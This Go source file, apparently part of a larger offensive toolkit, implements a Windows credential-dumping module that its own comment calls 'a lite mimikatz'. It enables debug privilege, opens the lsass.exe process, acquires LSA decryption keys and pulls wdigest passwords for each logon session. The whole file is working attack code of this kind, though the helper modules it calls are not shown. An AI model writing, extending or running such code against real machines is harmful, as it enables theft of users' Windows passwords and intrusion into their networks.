// +build windows

package kiwi

import (
	"context"
	"fmt"
	"runtime"
	"sync"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
	"project/internal/random"
	"project/internal/security"
)

// ErrKiwiClosed is an error about closed.
var ErrKiwiClosed = fmt.Errorf("kiwi module is closed")

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	rand *random.Rand

	debug bool  // is get debug privilege
	wow64 uint8 // 0 = not read, 1 = true, 2 = false

	// version about windows
	major uint32
	minor uint32
	build uint32

	lsass   *lsass
	session *session
	lsaNT5  *lsaNT5
	lsaNT6  *lsaNT6
	wdigest *wdigest

	closed bool

	mu sync.Mutex // global

	// prevent dead loop
	context context.Context
	cancel  context.CancelFunc
}

// NewKiwi is used to create a new kiwi module.
func NewKiwi(lg logger.Logger) (*Kiwi, error) {
	switch arch := runtime.GOARCH; arch {
	case "386", "amd64":
	default:
		return nil, errors.Errorf("architecture %s is not supported", arch)
	}
	kiwi := &Kiwi{
		logger: lg,
		rand:   random.NewRand(),
	}
	isWow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if isWow64 {
		kiwi.logf(logger.Warning, "running kiwi (x86) in the x64 Windows")
	}
	major, minor, build := kiwi.getWindowsVersion()
	switch major {
	case 5:
		kiwi.lsaNT5 = newLSA5(kiwi)
	case 6, 10:
		kiwi.lsaNT6 = newLSA6(kiwi)
	default:
		return nil, errors.Errorf("unsupported major NT version: %d", major)
	}
	kiwi.logf(logger.Debug, "major: %d, minor: %d, build: %d", major, minor, build)
	kiwi.lsass = newLsass(kiwi)
	kiwi.session = newSession(kiwi)
	kiwi.wdigest = newWdigest(kiwi)
	kiwi.context, kiwi.cancel = context.WithCancel(context.Background())
	return kiwi, nil
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

func (kiwi *Kiwi) waitSwitchThreadAsync(d ...<-chan struct{}) {
	security.WaitSwitchThreadAsync(kiwi.context, d...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	_, err := privilege.RtlEnableDebug()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.closed {
		return nil, ErrKiwiClosed
	}
	pHandle, err := kiwi.lsass.OpenProcess()
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
	err = kiwi.acquireLSAKeys(pHandle)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to acquire LSA keys")
	}
	sessions, err := kiwi.session.GetLogonSessionList(pHandle)
	if err != nil {
		return nil, err
	}
	creds := make([]*Credential, 0, len(sessions))
	for _, session := range sessions {
		cred := Credential{
			Session: session,
			Wdigest: nil,
		}
		wdigest, err := kiwi.wdigest.GetPassword(pHandle, session.LogonID)
		if err != nil {
			kiwi.log(logger.Error, "wdigest:", err)
		} else {
			cred.Wdigest = wdigest
		}
		creds = append(creds, &cred)
	}
	return creds, nil
}

// acquireLSAKeys is used to get keys to decrypt credentials.
func (kiwi *Kiwi) acquireLSAKeys(pHandle windows.Handle) error {
	if kiwi.lsaNT5 != nil {
		return kiwi.lsaNT5.acquireKeys(pHandle)
	}
	if kiwi.lsaNT6 != nil {
		return kiwi.lsaNT6.acquireKeys(pHandle)
	}
	panic("kiwi: internal error")
}

// Close is used to close kiwi module.
func (kiwi *Kiwi) Close() error {
	kiwi.cancel()
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.closed {
		return nil
	}
	kiwi.lsass.Close()
	kiwi.session.Close()
	if kiwi.lsaNT5 != nil {
		kiwi.lsaNT5.Close()
	}
	if kiwi.lsaNT6 != nil {
		err := kiwi.lsaNT6.Close()
		if err != nil {
			return err
		}
	}
	kiwi.wdigest.Close()
	kiwi.closed = true
	return nil
}
